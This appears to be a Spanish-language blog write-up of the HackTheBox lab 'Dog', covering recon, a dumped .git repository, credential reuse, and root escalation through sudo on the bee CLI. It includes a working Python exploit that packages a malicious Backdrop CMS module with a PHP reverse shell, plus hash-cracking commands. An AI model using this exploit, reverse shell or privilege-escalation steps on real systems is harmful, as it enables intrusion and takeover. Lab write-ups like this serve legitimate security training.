---
title: Dog - HackTheBox Season 7
date: 2025-03-15 11:00:00 +0000
categories: [Labs CTF, Write Up, Hackthebox]
tags: [Linux, CTF, Write Up, Hackthebox]
image:
  path: /assets/img/posts/dog_htb_s7/cabecera.png
  alt: HackTheBox
description: >
  Guía en español para Dog - HackTheBox Season 7
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

```bash
❯ nmap -sCV -O -Pn --open dog.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-09 19:59 CET
Nmap scan report for dog.htb (10.10.11.58)
Host is up (0.046s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.93 seconds
```

Como estamos acostumbrados, nos vemos ante un servidor web en el puerto 80 y un servidor SSH en el puerto 22.


## Explorando la web

![alt text](/assets/img/posts/dog_htb_s7/image.png)

Lo primero que observamos interesante es un sección about, posts donde podemos ver los posibles usuarios registrados en el sitio y un apartado de login.

Al final de la web podemos ver la tecnología con la que se a construido el sitio web.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-1.png)

Explorando el login de la web, encontramos que nos verficar si el usuario es o no correcto antes de poder entrar, lo que nos permite filtrar posibles usuarios aun sin saber la contraseña.

En el about encontramos un correo de soporte `support@dog.htb` que nos da a conocer el dominio de mail que maneja el sitio web, aunque en HackTheBox siempre suelen ser de un estilo similar.

Si intentamos acceder a la web con este mail nos indica que no existe pero, tras un rato probando usuarios típicos como `admin` tampoco existen.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-2.png)

Encontramos un posible usuario pero seguimos sin saber la contraseña.

Mientras podríamos intentar una fuerza bruta pero tiene un manejo de inicio de sesión con tokens que se generan en cada intento, por lo que no es posible.

Aqui lo podemos ver en BurpSuite.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-3.png)

Este id se regenera con cada intento de inicio de sesión.

## Enumerando directorios y subdominios

Mientras exploramos la web podemos ir ejecutando un scrapeo de directorios y subdominios.

```bash
❯ gobuster dir -u http://dog.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Aquí encontramos algo muy interesante y es que parece haber un directorio .git, lo que indica que potencialmente podemos descargar el código fuente del sitio web.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-4.png)

Usamos [GitDumper](https://github.com/arthaud/git-dumper)

```bash
python3 git_dumper.py http://dog.htb /home/sdksdk/Downloads/dog-htb  
```

Una vez descargados los archivos vamos a ir explorando el código fuente.

## Explorando el código fuente

Para resumir, en el código lo más interesante que encontré fue el contenido del archivo `settings.php` que nos da información sobre la base de datos de MySQL.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-5.png)

Ahora que tenemos unas credenciales supuestamente válidas para SQL, siempre podemos probarlas en cualquier login por si no se siguen buenas prácticas de seguridad.

Intentando autenticarnos con el usuario **dogBackDropSystem** no parece funcionar por lo que tenemos que encontrar otros posibles usuarios.

Como sabemos de antemano que el dominio de mail es `dog.htb` podemos intentar buscar en el código fuente si existe algo relacionado con este dominio.

Para no tener que buscar a mano por todo el código podemos realizar una búsqueda recursiva en el directorio `/home/sdksdk/Downloads/dog-htb`.

```bash
find . -type f -print0 | xargs -0 grep -i "@DOG.htb"
```
 
El comando en este caso lo hemos ejecutado en la ruta donde se encuentran los archivos descargados.

Esto revela un usuario dentro de la configuración.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-6.png)
 
## Login en la web

Con este nuevo usuario y la contraseña encontrada podemos entrar en la web.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-7.png)

En este punto y tras un rato explorando todas las opciones que ofrece Backdrop CMS desde el panel busqué posibles vulnerabilidades realacionadas con el CMS.

Encontramos una vulnerabilidad que nos permite ejecutar RCE mediante modulos maliciosos en el panel de administración. 

[Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)](https://www.exploit-db.com/exploits/52021)

Este PoC crea un modulo malicioso en el que mediante PHP crea un shell cmd para ejecutar comandos desde un panel web pero yo lo he modificado para que se ejecute una shell reversa directamente en el sistema.

```python
import os
import time
import tarfile

def create_files():
    # Contenido del archivo .info
    info_content = """
    type = module
    name = Block
    description = Controls the visual building blocks a page is constructed
    with. Blocks are boxes of content rendered into an area, or region, of a
    web page.
    package = Layouts
    tags[] = Blocks
    tags[] = Site Architecture
    version = BACKDROP_VERSION
    backdrop = 1.x

    configure = admin/structure/block

    ; Added by Backdrop CMS packaging script on 2024-03-07
    project = backdrop
    version = 1.27.1
    timestamp = 1709862662
    """
    shell_info_path = "shell/shell.info"
    os.makedirs(os.path.dirname(shell_info_path), exist_ok=True)  # Crea la carpeta si no existe
    with open(shell_info_path, "w") as file:
        file.write(info_content)

    # Contenido del archivo .php (shell reversa)
    shell_content = """
    <?php
    $ip = '10.10.10.10';  // Cambia por tu IP
    $port = 4444;          // Cambia por tu puerto

    // Abre un socket al atacante
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        die("Failed to connect: $errstr ($errno)");
    }

    // Redirige la shell al socket
    $descriptorspec = array(
        0 => $sock,  // stdin
        1 => $sock,  // stdout
        2 => $sock   // stderr
    );

    $process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
    if (!is_resource($process)) {
        die("Failed to spawn shell");
    }

    // Espera a que el proceso termine
    proc_close($process);
    ?>
    """
    shell_php_path = "shell/shell.php"
    with open(shell_php_path, "w") as file:
        file.write(shell_content)
    return shell_info_path, shell_php_path

def create_tar_gz(info_path, php_path):
    # Nombre del archivo .tar.gz
    tar_filename = "shell.tar.gz"
    with tarfile.open(tar_filename, "w:gz") as tar:
        tar.add(info_path, arcname='shell/shell.info')
        tar.add(php_path, arcname='shell/shell.php')
    return tar_filename

def main(url):
    print("Backdrop CMS 1.27.1 - Remote Command Execution Exploit")
    time.sleep(3)

    print("Generando módulo malicioso...")
    time.sleep(2)

    info_path, php_path = create_files()
    tar_filename = create_tar_gz(info_path, php_path)

    print(f"Módulo malicioso generado: {tar_filename}")
    time.sleep(2)

    print(f"Ve a {url}/admin/modules/install y sube el archivo {tar_filename} para instalación manual.")
    time.sleep(2)

    print(f"Tu shell estará en: {url}/modules/shell/shell.php")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Uso: python script.py [url]")
    else:
        main(sys.argv[1])
```

Usando este script obtenemos el modulo listo para instalar.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-8.png)

Para instalar el módulo, en el panel de administración navegamos hasta functionalidades -> instalar módulos nuevos

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-9.png)

Indicamos instalación manual y subimos el archivo `shell.tar.gz` que hemos creado.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-10.png)

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-11.png)

Cuando lo instalemos podemos navegar a la ruta `/modules/shell/shell.php` no sin antes ejecutar nuestro netcat para recibir la shell.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-12.png)

Deberíamos recibir la shell rápidamente.

Ahora la estabilizamos y nos disponemos a explorar el sistema.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-13.png)

## Explorando el sistema

La shell obtenida es como `www-data` por lo que no tenemos permisos para acceder a la flag de usuario.

Verificando de nuevo que los datos de la base MYSQL son los mismos que os del código fuento, podemos intentar acceder a la base de datos.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-14.png)

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-15.png)

En la tabla de users encontramos todos los usuarios de la web.

```mysql
mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| backdrop           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

```mysql
mysql> USE backdrop 
Database changed
mysql> SHOW tables
    -> ;
+-----------------------------+
| Tables_in_backdrop          |
+-----------------------------+
| batch                       |
| cache                       |
| cache_admin_bar             |
| cache_bootstrap             |
| cache_entity_comment        |
| cache_entity_file           |
| cache_entity_node           |
| cache_entity_taxonomy_term  |
| cache_entity_user           |
| cache_field                 |
| cache_filter                |
| cache_layout_path           |
| cache_menu                  |
| cache_page                  |
| cache_path                  |
| cache_token                 |
| cache_update                |
| cache_views                 |
| cache_views_data            |
| comment                     |
| field_data_body             |
| field_data_comment_body     |
| field_data_field_image      |
| field_data_field_tags       |
| field_revision_body         |
| field_revision_comment_body |
| field_revision_field_image  |
| field_revision_field_tags   |
| file_managed                |
| file_metadata               |
| file_usage                  |
| flood                       |
| history                     |
| menu_links                  |
| menu_router                 |
| node                        |
| node_access                 |
| node_comment_statistics     |
| node_revision               |
| queue                       |
| redirect                    |
| search_dataset              |
| search_index                |
| search_node_links           |
| search_total                |
| semaphore                   |
| sequences                   |
| sessions                    |
| state                       |
| system                      |
| taxonomy_index              |
| taxonomy_term_data          |
| taxonomy_term_hierarchy     |
| tempstore                   |
| url_alias                   |
| users                       |
| users_roles                 |
| variable                    |
| watchdog                    |
+-----------------------------+
59 rows in set (0.00 sec)
```

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-16.png)

Como podemos listar los usuario del sistema con sus directorios en /home o en /etc/passwd nos vamos a centrar en crackear la contraseña de uno de ellos.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-17.png)

Como el usuario de la flag es `johncusack` podemos intentar crackear su contraseña.

## Crackeando el hash

El hash que se utiliza es un hash de Drupal/Backdrop CMS. Estos hashes tienen las siguientes características:

- Formato: $S$ seguido de un carácter que indica la configuración de hashing (en este caso, E).

- Algoritmo: SHA-512.

Salt: Incluido en el propio hash.

Preparamos el hash para hashcat.

```plaintext
$S$EYniSfXXXXXXXXXXXXXXXXz8EIkjUD66n/OTdQBFklAji.
```

Ahora para la wordlist vamos a usar rockyou.txt pero además por si se diera el caso vamos a añadir la propia credencial de la cuenta que utilizamos para inciar sesión en el panel web de Backdrop CMS.

```bash
hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt
```

Tras un buen rato y perdida toda esperanza de poder crackear el hash, me dió por probar a conectar al usuario `johncusack` con la contraseña que conseguimos para acceder tanto a la base de datos como al panel de administración y efectivamente no nos permite entrar.

## Acceso por SSH

```bash
ssh johncusack@dog.htb
```

### User flag

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-18.png)

### Escalado de privilegios

Ahora que tenemos acceso y su contraseña, con un simple `sudo -l` podemos ver que podemos ejecutar comandos como root.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-19.png)

Tenemos el permiso para ejecutar `bee`. Bee es una herramienta de línea de comandos para Backdrop CMS (similar a drush en Drupal). Se utiliza para ejecutar tareas administrativas, evaluar código PHP, y gestionar el sitio.

Viendo los comandos de los que dispone, encontramos uno que nos puede permitir ejecutar comandos PHP con privilegios de root.

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-20.png)

Probé con este comando

```bash
sudo /usr/local/bin/bee eval "echo shell_exec('cat /root/root.txt');"
```

Pero obtenía el siguiente error:

```bash
✘  The required bootstrap level for 'eval' is not ready.
```

El error indica que el entorno de bee no está completamente inicializado (bootstrap level), que puede suceder por varias razones:

- Bootstrap incompleto: bee no ha cargado completamente las dependencias de Backdrop CMS.

- Configuración incorrecta: El archivo de configuración de Backdrop CMS no está accesible o está mal configurado.

Con un poco de búsqueda la solución fue forzar el bootstrap a un nivel más alto de directorio.

```bash
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cat /root/root.txt');"
```

**--root=/var/www/html**: Especifica la ruta raíz de la instalación de Backdrop CMS.

### Root flag

![alt text](/assets/img/posts/dog_htb_s7/image.pngimage-21.png)

